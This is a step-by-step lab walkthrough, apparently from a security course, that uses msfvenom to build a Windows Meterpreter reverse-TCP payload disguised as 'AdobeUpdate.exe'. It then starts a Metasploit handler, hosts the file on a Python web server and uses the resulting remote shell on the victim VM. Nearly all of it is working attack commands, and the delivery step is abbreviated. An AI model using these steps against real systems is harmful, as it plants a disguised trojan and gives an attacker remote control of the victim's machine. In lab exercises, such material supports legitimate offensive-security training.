1. msfvenom --list formats ( to see a list of output formats that msfvenom supports.)

2. msfvenom -p windows/meterpreter/reverse_tcp LHOST=virbr1 -f exe > /tmp/AdobeUpdate.exe < virbr1 = ipaddress >
 
 -p :– selects the payload to be the same one we used during the exploitation lab – meterpreter.
 -f exe :– selects the file type of the output executable
 LHOST=virbr1 :– sets LHOST to be the name of the adapter on which Kali has its 192.168.56.0/24 address. msfconsole should translate it for us.
> /tmp/AdobeUpdate.exe :– redirects the output from running the msfvenom command into a file called AdobeUpdate.exe, stored in the /tmp directory.


3. Verify that the output file is about 73802 bytes in size.

4. Run an msf handler to listen for the meterpreter reverse connection which will be incoming when our malicious AdobeUpdate.exe payload file is    executed.

 On Kali, open a new terminal window and enter   msfconsole.
 Enter   use exploit/multi/handler.

 Enter  set PAYLOAD windows/meterpreter/reverse_tcp.
 Enter  set LHOST virbr1.
 Enter  exploit -j. < The -j option jobifies the exploit, or runs it as a job in the background. >


5. Now, we need to set up a way to deliver the payload to the victim. Set up a web server to host your malicious file.

 Change directories to   < /tmp by entering cd /tmp in a kali terminal. >
 Check that the payload you generated earlier is in this directory:  < run ls >
 Now, from that directory, run the following command to use an http webserver built into python to serve content from the current directory (/tmp) on  an arbitrary port - 8888:   < python3 -m http.server 8888 >

 Command shell session X opened,” where X is the number of the new session.

 sessions -i [the number of the new session] :-  This should open a connection to a meterpreter on the Windows VM.


Run < shell > to drop down into a windows cmd prompt
	Type < whoami > to see the privileges that you are running under. Note that these are the privileges of the user of your Windows VM.
	Run the command < netstat -n > to see a listing of open connections on the Windows server. Note the “ESTABLISHED” connection from the Windows VM to your Kali VM.
	Return to your meterpreter shell by running < exit > to leave the cmd prompt.
